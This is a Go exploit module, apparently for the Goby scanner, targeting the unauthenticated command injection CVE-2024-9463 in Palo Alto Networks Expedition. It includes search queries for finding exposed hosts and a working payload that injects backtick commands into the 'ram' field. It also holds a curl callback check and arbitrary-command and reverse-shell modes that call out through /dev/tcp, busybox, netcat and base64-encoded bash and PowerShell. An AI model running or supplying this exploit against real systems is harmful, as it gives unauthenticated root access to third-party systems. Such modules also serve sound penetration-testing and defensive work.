package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Palo Alto Networks Expedition /API/convertCSVtoParquet.php Command Execution Vulnerability (CVE-2024-9463)",
    "Description": "<p>Palo Alto Networks Expedition is a tool developed by Palo Alto Networks to assist with configuration migration, optimization, and enrichment. A remote command execution vulnerability exists in the convertCSVtoParquet interface of Palo Alto Networks Expedition versions below 1.2.92. Unauthenticated attackers can exploit this vulnerability to execute arbitrary operating system commands as root, gaining system privileges and posing significant security risks.</p>",
    "Product": "Palo Alto Networks Expedition",
    "Homepage": "https://live.paloaltonetworks.com/t5/expedition/ct-p/migration_tool",
    "DisclosureDate": "2024-10-09",
    "PostTime": "2025-01-10",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "title=\"Expedition Project\" && body=\"920f08d4-293e-4c95-8341-73195e5d8d00\"",
    "GobyQuery": "title=\"Expedition Project\" && body=\"920f08d4-293e-4c95-8341-73195e5d8d00\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to execute arbitrary commands remotely, gain system privileges, and potentially compromise sensitive data or control the system entirely.</p>",
    "Recommendation": "<p>The vendor has released a patch to address the vulnerability. Users are advised to upgrade to version 1.2.96 or higher. Patch download link: <a href=\"https://security.paloaltonetworks.com/PAN-SA-2024-0010\">https://security.paloaltonetworks.com/PAN-SA-2024-0010</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247502500&idx=1&sn=38e5bc2cf558c49c7b9b71342e9a74b3",
        "https://security.paloaltonetworks.com/PAN-SA-2024-0010"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command,Reverse",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Reverse",
            "type": "select",
            "value": "ByBash,BySh",
            "show": "Mode=Reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-9463"
    ],
    "CNNVD": [
        "CNNVD-202410-960"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Palo Alto Networks Expedition /API/convertCSVtoParquet.php 命令执行漏洞（CVE-2024-9463）",
            "Product": "Palo Alto Networks Expedition",
            "Description": "<p>Palo Alto Networks Expedition是一种由美国Palo Alto Networks公司开发的工具，旨在帮助用户进行配置迁移、调优和丰富功能。Palo Alto Networks Expedition 1.2.92 以下版本的 convertCSVtoParquet 接口存在远程命令执行漏洞。未经身份验证的攻击者可以利用该漏洞以 root 身份运行任意操作系统命令，从而获取系统权限并造成严重的安全风险。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，建议用户尽快升级至安全版本 1.2.96 或更高版本。补丁获取链接：<a href=\"https://security.paloaltonetworks.com/PAN-SA-2024-0010\">https://security.paloaltonetworks.com/PAN-SA-2024-0010</a></p>",
            "Impact": "<p>未经身份验证的攻击者可以利用该漏洞远程执行任意命令，获取系统权限。这可能导致敏感数据泄露、系统被完全控制以及进一步的攻击。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Palo Alto Networks Expedition /API/convertCSVtoParquet.php Command Execution Vulnerability (CVE-2024-9463)",
            "Product": "Palo Alto Networks Expedition",
            "Description": "<p>Palo Alto Networks Expedition is a tool developed by Palo Alto Networks to assist with configuration migration, optimization, and enrichment. A remote command execution vulnerability exists in the convertCSVtoParquet interface of Palo Alto Networks Expedition versions below 1.2.92. Unauthenticated attackers can exploit this vulnerability to execute arbitrary operating system commands as root, gaining system privileges and posing significant security risks.</p>",
            "Recommendation": "<p>The vendor has released a patch to address the vulnerability. Users are advised to upgrade to version 1.2.96 or higher. Patch download link: <a href=\"https://security.paloaltonetworks.com/PAN-SA-2024-0010\">https://security.paloaltonetworks.com/PAN-SA-2024-0010</a></p>",
            "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to execute arbitrary commands remotely, gain system privileges, and potentially compromise sensitive data or control the system entirely.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "Palo Alto Networks Expedition"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecNoEcho"
    },
    "VariablesOrder": [
        "TEMPLATE"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`

	//请求发送
	sendPostPayload_hUsKxLZsDxJSDkahOAnXcsbkaGkaIKNds := func(hostInfo *httpclient.FixUrl, command string) (err error) {
		// 文件上传
		postRequestConfig := httpclient.NewPostRequestConfig("/API/convertCSVtoParquet.php")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Data = fmt.Sprintf("ram=watchTowr`%s`", url.QueryEscape(strings.ReplaceAll(command, "+", "%2b")))

		// 请求头
		head := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}

		//发起请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return err
		}

		if response.StatusCode != 200 {
			return errors.New("rce fail")
		}
		// 注意：返回值
		return nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：如果漏洞存在则设置的VulURL路径
			vulURL := "/API/convertCSVtoParquet.php"

			// 函数继承
			runPayload := sendPostPayload_hUsKxLZsDxJSDkahOAnXcsbkaGkaIKNds

			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			pocCommand := "curl  " + checkUrl
			if isDomain {
				 //pocCommand = "ping -c 1 " + checkUrl
				pocCommand = "curl http://" + checkUrl
			}

			// 上传文件进行命令执行
			err := runPayload(u, pocCommand)
			if err != nil {
				return false
			}

			if godclient.PullExists(checkStr, time.Second*15) {
				//
				ss.VulURL = u.HostInfo + vulURL
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := sendPostPayload_hUsKxLZsDxJSDkahOAnXcsbkaGkaIKNds

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			ReverseTcpByBash := func(rp string) string {
				return fmt.Sprintf(`/bin/bash -c "/bin/bash -i >& /dev/tcp/%s/%s 0>&1"`, godclient.GetGodServerIP(), rp)
			}
			ReverseTCPBySh := func(rp string) string {
				return fmt.Sprintf(`bash -c "%s"`, godclient.ReverseTCPBySh(rp))
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             ReverseTcpByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["Mode"])
			switch attackType {
			case "Command":
				//配置命令
				expCommand := goutils.B2S(ss.Params["Command"])
				err := runPayload(expResult.HostInfo, expCommand)
				if err != nil {
					expResult.Success = false
					expResult.Output = "执行失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = "执行成功，该漏洞无回显，请自行判断执行效果"
			case "Reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["Reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
